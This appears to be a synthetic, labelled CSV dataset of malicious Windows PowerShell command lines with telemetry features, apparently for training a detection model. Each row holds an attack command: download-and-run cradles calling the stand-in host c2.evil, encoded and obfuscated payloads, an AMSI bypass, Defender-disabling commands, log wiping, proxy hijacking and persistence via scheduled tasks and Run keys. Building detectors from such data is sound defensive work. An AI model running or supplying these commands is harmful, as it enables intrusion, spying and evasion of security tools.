guid,pid,command_line,parent_count,child_process_count,network_connections,dns_queries,files_created,has_invoke,has_download,has_encoded,entropy,first_seen,label
{3151bb94-9f86-6908-51cd-71cd-08e87455c604},8211,IEX (New-Object Net.WebClient).DownloadString('http://c2.evil/sharphound.ps1'),1,1,1,0,4,True,True,False,0.487,2025-11-06T08:26:34.190784+00:00Z,1
{e46ac676-3a95-6908-103b-1f25-70292c42b7f3},8212,powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACcAQwA6AFwAdABlAG0AcABcAGMAbwBiAGEAbAB0AHMAdAByAGkAawBlAC4AZQB4AGUAJwAgAC0AVwBpAG4AZABvAHcAUwB0AHkAbABlACAASABpAGQAZABlAG4A,1,4,2,1,2,False,False,True,0.214,2025-11-06T08:26:35.190817+00:00Z,1
{a08cafbf-2325-6908-b3a2-2ddc-0f0820061fdb},8213,IEX (New-Object Net.WebClient).DownloadString('http://c2.evil/beacon.ps1'),1,4,2,2,3,True,True,False,0.5,2025-11-06T08:26:36.190847+00:00Z,1
{a24eae81-c400-6908-0ce0-36d2-2d1d9f3df699},8214,"powershell -nop -w hidden -c ""IEX((New-Object Net.WebClient).DownloadString('http://c2.evil/stage0.ps1'))""",1,3,3,3,2,True,True,False,0.368,2025-11-06T08:26:37.190882+00:00Z,1
{c1c1ba4f-409f-6908-eaee-5dd5-e7f764ecfbeb},8215,reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings /v ProxyEnable /t REG_DWORD /d 1 /f,1,3,4,1,2,False,False,False,0.361,2025-11-06T08:26:38.190916+00:00Z,1
{9fa0aa69-f255-6908-ef25-2939-51bca9927ca9},8216,IEX ('reg add HKCU\Software\Mic'+'rosoft\Windows\CurrentVer'+'sion\Internet Settings /v'+' ProxyServer /t REG_SZ /d'+' 127.0.0.1:8080 /f'),1,3,1,2,4,True,False,False,0.341,2025-11-06T08:26:39.190955+00:00Z,1
{b9def348-c1be-6908-4e02-388e-2c7b269bded7},8217,powershell -EncodedCommand bgBlAHQAcwBoACAAdwBpAG4AaAB0AHQAcAAgAHMAZQB0ACAAcAByAG8AeAB5ACAAMQAyADcALgAwAC4AMAAuADEAOgA4ADAAOAAwAA==,1,4,5,1,1,False,False,True,0.275,2025-11-06T08:26:40.190990+00:00Z,1
{3bc6c4e2-7360-6908-acba-9333-5b87ce691f9d},8218,"$fonmar='powershell -c ""IEX (New-Object Net.WebClient).DownloadString('http://c2.evil/proxy.ps1');Set-Proxy""';IEX $fonmar",1,3,4,2,1,True,True,False,0.38,2025-11-06T08:26:41.191029+00:00Z,1
{2fbdaf4f-0f01-6908-3ca7-cd8a-9f350d0b9063},8219,powershell -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwAyAC4AZQB2AGkAbAAvAHMAYwByAGUAZQBuAHMAaABvAHQALgBwAHMAMQAnACkAOwBUAGEAawBlAC0AUwBjAHIAZQBlAG4AcwBoAG8AdAA=,1,1,1,1,2,False,False,True,0.168,2025-11-06T08:26:42.191067+00:00Z,1
{efd1422e-3bca-6908-7b3d-36c0-eeead298404d},8220,"$pycuaa='powershell -c ""Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait('{CAPSLOCK}')""';IEX $pycuaa",1,5,5,2,1,True,False,False,0.341,2025-11-06T08:26:43.191102+00:00Z,1
{70033ea7-7268-6908-ace6-54cf-3d1fb4c77a96},8221,powershell -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwAyAC4AZQB2AGkAbAAvAGsAZQB5AGwAbwBnAGcAZQByAC4AcABzADEAJwApADsAUwB0AGEAcgB0AC0ASwBlAHkAbABvAGcAZwBlAHIA,1,4,4,0,2,False,False,True,0.182,2025-11-06T08:26:44.191141+00:00Z,1
{625ac0d9-f655-6908-fb17-3dc1-655b8914d039},8222,$vdfptq='Start-Process 'C:\temp\mic.exe' -ArgumentList '/record' -WindowStyle Hidden';IEX $vdfptq,1,2,5,0,1,True,False,False,0.423,2025-11-06T08:26:45.191180+00:00Z,1
{080eee5e-56e5-6908-8387-9619-4518c49dc4fc},8223,IEX (New-Object Net.WebClient).DownloadString('http://c2.evil/webcam.ps1');Start-Webcam,1,4,4,3,1,True,True,False,0.448,2025-11-06T08:26:46.191214+00:00Z,1
{245c92cb-a4ca-6908-1c1e-3b1a-d02ad6b6fb16},8224,"powershell -c ""IEX (New-Object Net.WebClient).DownloadString('http://c2.evil/clipboard.ps1');Watch-Clipboard""",1,3,1,1,2,True,True,False,0.358,2025-11-06T08:26:47.191249+00:00Z,1
{230f6359-95ee-6908-21c5-70d7-053b0609ac3b},8225,IEX ('IEX (New-Object Net.WebCl'+'ient).DownloadString('htt'+'p://c2.evil/uac.ps1');Byp'+'ass-UAC'),1,6,1,3,4,True,True,False,0.444,2025-11-06T08:26:48.191278+00:00Z,1
{547a8ad4-9ea5-6908-2e72-2fdb-a6d600cdcce8},8226,powershell -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAC0AYwAgACIAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAHAAbwB3AGUAcgBzAGgAZQBsAGwAIAAtAFYAZQByAGIAIAByAHUAbgBBAHMAIAAtAEEAcgBnAHUAbQBlAG4AdABMAGkAcwB0ACAAJwAtAGMAIABJAEUAWAAoACgAZwBjACAAQwA6AFwAdABlAG0AcABcAGUAbABlAHYALgBwAHMAMQApAHwASQBFAFgAKQAnACIA,1,3,5,3,1,False,False,True,0.154,2025-11-06T08:26:49.191316+00:00Z,1
{1936059c-77ea-6908-be85-fed9-326981b669c6},8227,IEX (New-Object Net.WebClient).DownloadString('http://c2.evil/token.ps1');Steal-Token,1,2,5,3,2,True,True,False,0.471,2025-11-06T08:26:50.191356+00:00Z,1
{5baca439-e211-6908-3418-0dfc-683a75eff2a9},8228,powershell -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAC0AYwAgACIAJgAgAHsARwBlAHQALQBQAHIAbwBjAGUAcwBzACAAbABzAGEAcwBzACAAfAAgAFMAdABvAHAALQBQAHIAbwBjAGUAcwBzACAALQBGAG8AcgBjAGUAfQAiAA==,1,6,4,1,4,False,False,True,0.225,2025-11-06T08:26:51.191401+00:00Z,1
{d8bfc4d5-eb04-6908-5cb4-c442-52f10cc0623f},8229,powershell -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwAyAC4AZQB2AGkAbAAvAHAAZQByAHMAaQBzAHQAZQBuAGMAZQAuAHAAcwAxACcAKQA7AEEAZABkAC0AUABlAHIAcwBpAHMAdABlAG4AYwBlAA==,1,4,5,2,1,False,False,True,0.177,2025-11-06T08:26:52.191441+00:00Z,1
{b4d713fb-ad30-6908-6a9f-cd41-d5cb79d3cba0},8230,"powershell -c ""IEX (New-Object Net.WebClient).DownloadString('http://c2.evil/cleanup.ps1');Remove-Traces""",1,5,1,2,4,True,True,False,0.41,2025-11-06T08:26:53.191481+00:00Z,1
{c5a1faa6-f2d2-6908-6668-d613-2ae8be010fe7},8231,powershell -EncodedCommand dwBlAHYAdAB1AHQAaQBsACAAYwBsACAAUwB5AHMAdABlAG0A,1,1,3,3,4,False,False,True,0.373,2025-11-06T08:26:54.191516+00:00Z,1
{dc3d7f96-42ae-6908-e92f-6998-1e882e25acf4},8232,$wgugvm='wevtutil cl Application';IEX $wgugvm,1,6,1,3,3,True,False,False,0.511,2025-11-06T08:26:55.191557+00:00Z,1
{4b662fe0-be70-6908-3a60-93f1-ceec8d6fccd5},8233,powershell -EncodedCommand UgBlAG0AbwB2AGUALQBJAHQAZQBtACAAQwA6AFwAdABlAG0AcABcACoAIAAtAFIAZQBjAHUAcgBzAGUAIAAtAEYAbwByAGMAZQA=,1,5,5,0,2,False,False,True,0.315,2025-11-06T08:26:56.191591+00:00Z,1
{4421d249-cb87-6908-898a-fdac-27a5d42de47a},8234,powershell -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAC0AYwAgACIARwBlAHQALQBIAGkAcwB0AG8AcgB5ACAAfAAgAEMAbABlAGEAcgAtAEgAaQBzAHQAbwByAHkAIgA=,1,1,4,1,4,False,False,True,0.28,2025-11-06T08:26:57.191628+00:00Z,1
{4797fe1e-729f-6908-39ec-e192-ddd0718fda3f},8235,powershell -EncodedCommand UgBlAG0AbwB2AGUALQBJAHQAZQBtACAAKABHAGUAdAAtAFAAUwBSAGUAYQBkAGwAaQBuAGUATwBwAHQAaQBvAG4AKQAuAEgAaQBzAHQAbwByAHkAUwBhAHYAZQBQAGEAdABoACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlAA==,1,2,3,2,1,False,False,True,0.185,2025-11-06T08:26:58.191669+00:00Z,1
{9ace5bb2-4123-6908-ec8d-50e5-5c407e460b4e},8236,powershell -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwAyAC4AZQB2AGkAbAAvAGYAaQBuAGEAbAAuAHAAcwAxACcAKQA=,1,2,5,3,1,False,False,True,0.215,2025-11-06T08:26:59.191703+00:00Z,1
{968e83ca-8790-6908-bf4d-0bfa-9a4a6f52449a},8237,Start-Sleep -Seconds 3600,1,5,1,1,1,False,False,False,0.68,2025-11-06T08:27:00.191743+00:00Z,1
{d82d6078-17c9-6908-54f1-5f51-27cfc58aac51},8238,IEX (New-Object Net.WebClient).DownloadString('http://c2.evil/1.ps1'),1,2,5,0,2,True,True,False,0.536,2025-11-06T08:27:01.191807+00:00Z,1
{cf41205c-a9ab-6908-b027-1e66-913e566fe0df},8239,powershell -EncodedCommand KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAEYAaQBsAGUAKAAnAGgAdAB0AHAAOgAvAC8AYwAyAC4AZQB2AGkAbAAvAHAAYQB5AGwAbwBhAGQALgBlAHgAZQAnACwAJwBDADoAXAB0AGUAbQBwAFwAeAAuAGUAeABlACcAKQA7AFMAdABhAHIAdAAtAFAAcgBvAGMAZQBzAHMAIABDADoAXAB0AGUAbQBwAFwAeAAuAGUAeABlAA==,1,2,2,1,3,False,False,True,0.157,2025-11-06T08:27:02.191846+00:00Z,1
{a525e50b-3eb1-6908-40ad-89f7-8a5ac0ae3ba6},8240,powershell -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAC0AYwAgACIASQBXAFIAIABoAHQAdABwADoALwAvAGMAMgAuAGUAdgBpAGwALwBtACAALQBPAHUAdABGAGkAbABlACAAJABlAG4AdgA6AFQARQBNAFAAXABtAC4AcABzADEAOwBJAEUAWAAgACQAZQBuAHYAOgBUAEUATQBQAFwAbQAuAHAAcwAxACIA,1,1,5,1,1,False,False,True,0.21,2025-11-06T08:27:03.191884+00:00Z,1
{03cfaa49-5d50-6908-8951-2f91-680390fcc940},8241,powershell -EncodedCommand UwB0AGEAcgB0AC0AQgBpAHQAcwBUAHIAYQBuAHMAZgBlAHIAIAAtAFMAbwB1AHIAYwBlACAAaAB0AHQAcAA6AC8ALwBjADIALgBlAHYAaQBsAC8AYgAgAC0ARABlAHMAdABpAG4AYQB0AGkAbwBuACAAJABlAG4AdgA6AFQARQBNAFAAXABiAC4AZQB4AGUAOwBTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAJABlAG4AdgA6AFQARQBNAFAAXABiAC4AZQB4AGUA,1,1,4,0,2,False,False,True,0.167,2025-11-06T08:27:04.191925+00:00Z,1
{eaf590ed-80f5-6908-c425-34ad-d9f89eed7567},8242,powershell -EncodedCommand YwBlAHIAdAB1AHQAaQBsACAALQB1AHIAbABjAGEAYwBoAGUAIAAtAHMAcABsAGkAdAAgAC0AZgAgAGgAdAB0AHAAOgAvAC8AYwAyAC4AZQB2AGkAbAAvAGMAIABDADoAXAB0AGUAbQBwAFwAYwAuAGUAeABlADsAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAEMAOgBcAHQAZQBtAHAAXABjAC4AZQB4AGUA,1,2,2,2,1,False,False,True,0.174,2025-11-06T08:27:05.191960+00:00Z,1
{515b045a-8ab4-6908-6b75-4776-35cba3cd07bb},8243,powershell -EncodedCommand SQBFAFgAIAAoAEkAVwBSACAAaAB0AHQAcAA6AC8ALwBjADIALgBlAHYAaQBsAC8AMgAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAKQA=,1,6,4,1,3,False,False,True,0.294,2025-11-06T08:27:06.191996+00:00Z,1
{ca8d3149-5c54-6908-03cd-9ae2-fc3b7bac9b44},8244,IEX ('(New-Object Net.WebClient'+').DownloadString('http://'+'c2.evil/3.ps1') | IEX'),1,3,2,1,4,True,True,False,0.471,2025-11-06T08:27:07.192034+00:00Z,1
{6eec28ad-1d5a-6908-aac6-b7f3-625b87c89c01},8245,powershell -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAC0AbgBvAHAAIAAtAHcAIABoAGkAZABkAGUAbgAgAC0AZQBwACAAYgB5AHAAYQBzAHMAIAAtAGMAIAAiAEkARQBYACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGMAMgAuAGUAdgBpAGwALwA0AC4AcABzADEAJwApACIA,1,4,2,0,3,False,False,True,0.155,2025-11-06T08:27:08.192074+00:00Z,1
{dff92d8f-bf18-6908-2909-c898-586028b5cba6},8246,powershell -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcAA6AC8ALwBjADIALgBlAHYAaQBsAC8ANQAuAHAAcwAxACAALQBPAHUAdABGAGkAbABlACAAJABlAG4AdgA6AFQARQBNAFAAXAA1AC4AcABzADEAOwBwAG8AdwBlAHIAcwBoAGUAbABsACAALQBGAGkAbABlACAAJABlAG4AdgA6AFQARQBNAFAAXAA1AC4AcABzADEA,1,2,2,2,4,False,False,True,0.166,2025-11-06T08:27:09.192109+00:00Z,1
{cafcbc0e-7dca-6908-8c0b-2ca4-599a92ca30b9},8247,Start-BitsTransfer http://c2.evil/6.ps1 $env:TEMP\6.ps1;IEX (gc $env:TEMP\6.ps1),1,4,1,1,4,True,False,False,0.438,2025-11-06T08:27:10.192148+00:00Z,1
{c2a04830-7070-6908-7dc0-bdd1-66cec354fc52},8248,$emhbsp='certutil -decode http://c2.evil/7.b64 C:\temp\7.exe;Start-Process C:\temp\7.exe';IEX $emhbsp,1,1,5,1,4,True,False,False,0.366,2025-11-06T08:27:11.192185+00:00Z,1
{bf94abfa-1c1a-6908-f2b0-df31-4275decc87f2},8249,IEX ((New-Object Net.WebClient).DownloadString('http://c2.evil/8')),1,3,4,1,2,True,True,False,0.537,2025-11-06T08:27:12.192226+00:00Z,1
{690dc911-065d-6908-8498-90f4-2fb1b669c307},8250,"IEX ('powershell -c ""& {IEX (Ne'+'w-Object Net.WebClient).D'+'ownloadString('http://c2.'+'evil/9.ps1')}""')",1,3,4,2,3,True,True,False,0.406,2025-11-06T08:27:13.192263+00:00Z,1
{c086789e-d80f-6908-6ab7-8084-95aa9aba4c01},8251,Invoke-RestMethod http://c2.evil/10 | IEX,1,1,3,0,4,True,False,False,0.659,2025-11-06T08:27:14.192302+00:00Z,1
{2b2fedc6-703a-6908-e3fd-9d84-27d1446f0620},8252,powershell -EncodedCommand SQBXAFIAIABoAHQAdABwADoALwAvAGMAMgAuAGUAdgBpAGwALwAxADEAIAAtAE0AZQB0AGgAbwBkACAAUABPAFMAVAAgAC0AQgBvAGQAeQAgACcAZABhAHQAYQA9ADEAJwAgAHwAIABJAEUAWAA=,1,5,3,1,4,False,False,True,0.263,2025-11-06T08:27:15.192337+00:00Z,1
{230656d1-153a-6908-8fce-ef6a-654d2c46e25e},8253,powershell -EncodedCommand KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwAyAC4AZQB2AGkAbAAvADEAMgAuAHAAcwAxACcAKQAgAD4AIAAkAGUAbgB2ADoAVABFAE0AUABcADEAMgAuAHAAcwAxADsASQBFAFgAIAAkAGUAbgB2ADoAVABFAE0AUABcADEAMgAuAHAAcwAxAA==,1,4,5,2,3,False,False,True,0.151,2025-11-06T08:27:16.192377+00:00Z,1
{13e10a19-dacc-6908-198d-9c04-965218076bff},8254,IEX ('Start-BitsTransfer -Sourc'+'e http://c2.evil/13.exe -'+'Destination C:\temp\13.ex'+'e;.& C:\temp\13.exe'),1,5,4,3,1,True,False,False,0.36,2025-11-06T08:27:17.192419+00:00Z,1
{a8bc30fa-2c9c-6908-bedb-112e-1e9ff039d524},8255,$kgovzb='certutil -urlcache -f http://c2.evil/14.exe C:\temp\14.exe;Start-Process C:\temp\14.exe';IEX $kgovzb,1,6,3,0,4,True,False,False,0.358,2025-11-06T08:27:18.192460+00:00Z,1
{e640bc25-74ae-6908-7ef7-e36f-7dc5825aac2e},8256,powershell -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwAyAC4AZQB2AGkAbAAvADEANQAuAHAAcwAxACcAKQA=,1,6,1,3,4,False,False,True,0.233,2025-11-06T08:27:19.192499+00:00Z,1
{a4728ffc-299d-6908-0844-e77c-dc9f81cf1f8d},8257,"IEX ('powershell -ep bypass -c '+'""IEX (IWR http://c2.evil/'+'16.ps1)""')",1,4,3,1,4,True,True,False,0.458,2025-11-06T08:27:20.192535+00:00Z,1
{dd43fb54-e2b4-6908-0f3a-d073-6970640876fb},8258,"$ddlgwk='[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)';IEX $ddlgwk",1,4,5,0,2,True,False,False,0.292,2025-11-06T08:27:21.192583+00:00Z,1
{ec0bcb99-d884-6908-9dad-865b-cf792bef0136},8259,powershell -EncodedCommand JABhAD0AWwBSAGUAZgBdAC4AQQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQAVAB5AHAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzACcAKQA7ACQAYQAuAEcAZQB0AEYAaQBlAGwAZAAoACcAYQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcALAAnAE4AbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkA,1,3,1,1,3,False,False,True,0.129,2025-11-06T08:27:22.192628+00:00Z,1
{fa781472-e637-6908-0db6-c2c1-5bf8994be696},8260,powershell -EncodedCommand cwBFAFQALQBJAHQARQBNACAAKAAgACcAVgAnACsAJwBhAFIAJwAgACsAIAAgACcASQBBACcAIAArACAAJwBiAGwARQA6ADEAcQAyACcAIAAgACsAIAAnAHUAWgB4ACcAIAApACAAIAAoACAAWwBUAFkAcABFAF0AKAAgACAAXAAiAHsAMQB9AHsAMAB9AFwAIgAtAEYAJwBGACcALAAnAHIARQAnACAAIAApACAAKQAgACAAOwAgACAAKAAgACAAIAAgAEcAZQBUAC0AVgBhAHIAaQBhAEIAbABlACAAIAAoACAAXAAiADEAUQAyAFUAXAAiACAAIAArACcAegBYACcAIAAgACkAIAAgACkALgBcACIAQQBgAHMAcwBgAEUAbQBiAGwAeQBcACIALgBcACIARwBFAFQAYABUAFkAYABQAGUAXAAiACgAKAAgACAAXAAiAHsANgB9AHsAMwB9AHsAM,1,1,2,2,2,False,False,True,0.051,2025-11-06T08:27:23.192673+00:00Z,1
{1c94d5c6-f165-6908-02db-c5d1-c0f9a24efba7},8261,"IEX ('[Runtime.InteropServices.'+'Marshal]::WriteInt32([Run'+'time.InteropServices.Mars'+'hal]::AllocHGlobal(4),0x4'+'1414141)')",1,1,5,0,3,True,False,False,0.328,2025-11-06T08:27:24.192722+00:00Z,1
{dbe79ccb-e894-6908-5194-cde1-d448f2247b8d},8262,$baqaqw='Disable-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux';IEX $baqaqw,1,5,4,1,3,True,False,False,0.346,2025-11-06T08:27:25.192765+00:00Z,1
{af77e124-c50e-6908-3869-57cd-f1caccc049ac},8263,Set-MpPreference -DisableRealtimeMonitoring $true,1,4,1,1,1,False,False,False,0.49,2025-11-06T08:27:26.192805+00:00Z,1
{43ba5ffa-89e4-6908-6fca-a6f1-5e25a6a55cfd},8264,Add-MpPreference -ExclusionPath 'C:\temp',1,3,1,2,2,False,False,False,0.659,2025-11-06T08:27:27.192829+00:00Z,1
{ed10891f-7216-6908-eac4-ba7c-04953fa72273},8265,powershell -EncodedCommand UwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgACcASABLAEwATQA6AFwAUwBPAEYAVABXAEEAUgBFAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzACAARABlAGYAZQBuAGQAZQByACcAIAAtAE4AYQBtAGUAIABEAGkAcwBhAGIAbABlAEEAbgB0AGkAUwBwAHkAdwBhAHIAZQAgAC0AVgBhAGwAdQBlACAAMQA=,1,2,1,1,3,False,False,True,0.157,2025-11-06T08:27:28.192862+00:00Z,1
{5ad817ba-d98e-6908-82fd-2887-e115d0add605},8266,powershell -EncodedCommand UwB0AG8AcAAtAFMAZQByAHYAaQBjAGUAIAAtAE4AYQBtAGUAIABXAGkAbgBEAGUAZgBlAG4AZAAgAC0ARgBvAHIAYwBlAA==,1,3,3,1,1,False,False,True,0.333,2025-11-06T08:27:29.192898+00:00Z,1
{693ec251-6529-6908-411c-762e-13ae6d8a0997},8267,IEX ('Set-Service -Name WinDefe'+'nd -StartupType Disabled'),1,5,2,2,3,True,False,False,0.517,2025-11-06T08:27:30.192929+00:00Z,1
{86415cd2-5e79-6908-54e1-d24b-05ac20f9bfc9},8268,reg add HKLM\SOFTWARE\Policies\Microsoft\Windows Defender /v DisableAntiSpyware /t REG_DWORD /d 1 /f,1,5,2,2,4,False,False,False,0.38,2025-11-06T08:27:31.192965+00:00Z,1
{3f798afb-a427-6908-f475-ccb4-e6e17ed4a540},8269,"IEX ('powershell -c ""Set-MpPref'+'erence -DisableIntrusionP'+'reventionSystem $true""')",1,1,2,2,2,True,False,False,0.395,2025-11-06T08:27:32.193004+00:00Z,1
{15aad29d-408a-6908-ce0e-050a-024307823bfb},8270,powershell -EncodedCommand bgBlAHQAIABzAHQAbwBwACAAVwBpAG4ARABlAGYAZQBuAGQA,1,6,5,0,3,False,False,True,0.427,2025-11-06T08:27:33.193042+00:00Z,1
{7ee6990b-4dfb-6908-f0ad-43c9-c47aabde5e49},8271,powershell -EncodedCommand cwBjACAAYwBvAG4AZgBpAGcAIABXAGkAbgBEAGUAZgBlAG4AZAAgAHMAdABhAHIAdAA9ACAAZABpAHMAYQBiAGwAZQBkAA==,1,3,1,1,2,False,False,True,0.301,2025-11-06T08:27:34.193081+00:00Z,1
{5eb9bbd8-436f-6908-0235-2b9c-7df45d4f9126},8272,$puqgxk='Remove-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name 'SecurityHealth'';IEX $puqgxk,1,2,3,0,3,True,False,False,0.395,2025-11-06T08:27:35.193113+00:00Z,1
{31b53390-a1a9-6908-cf35-31a1-1a89034273dd},8273,powershell -EncodedCommand UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0AUABVAEEAUAByAG8AdABlAGMAdABpAG8AbgAgADAA,1,4,3,0,2,False,False,True,0.313,2025-11-06T08:27:36.193151+00:00Z,1
{7bf9b984-6b80-6908-eb53-14a4-98b6309bcc9a},8274,powershell -EncodedCommand QQBkAGQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQB4AGMAbAB1AHMAaQBvAG4ARQB4AHQAZQBuAHMAaQBvAG4AIAAnAC4AcABzADEAJwA=,1,4,3,0,3,False,False,True,0.294,2025-11-06T08:27:37.193185+00:00Z,1
{d641beaf-d3bb-6908-a488-2705-24809bb99a3c},8275,powershell -EncodedCommand UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0AUwB1AGIAbQBpAHQAUwBhAG0AcABsAGUAcwBDAG8AbgBzAGUAbgB0ACAAMgA=,1,3,5,2,1,False,False,True,0.281,2025-11-06T08:27:38.193232+00:00Z,1
{5da17dc9-3be3-6908-cbf7-1802-fbd9a58864ff},8276,$ctcxlh='Set-MpPreference -MAPSReporting 0';IEX $ctcxlh,1,1,3,0,3,True,False,False,0.509,2025-11-06T08:27:39.193272+00:00Z,1
{8dffb34c-8eb1-6908-0ac5-e3be-4d98032fc3b2},8277,$rpkeyt='Set-MpPreference -HighThreatDefaultAction 6';IEX $rpkeyt,1,6,4,1,2,True,False,False,0.508,2025-11-06T08:27:40.193309+00:00Z,1
{6e97b81c-15cb-6908-f747-15ca-561c98b98619},8278,IEX ('schtasks /create /tn 'Upd'+'ater' /tr 'powershell -w '+'hidden -c IEX((gc C:\temp'+'\u.ps1)|IEX)' /sc onlogon'+' /ru System'),1,5,1,0,3,True,False,False,0.282,2025-11-06T08:27:41.193347+00:00Z,1
{3db02210-3d15-6908-390e-ce7a-972d0847feab},8279,IEX ('reg add HKCU\Software\Mic'+'rosoft\Windows\CurrentVer'+'sion\Run /v Updater /t RE'+'G_SZ /d 'powershell -ep b'+'ypass -w hidden C:\temp\u'+'.ps1' /f'),1,4,5,3,1,True,False,False,0.301,2025-11-06T08:27:42.193381+00:00Z,1
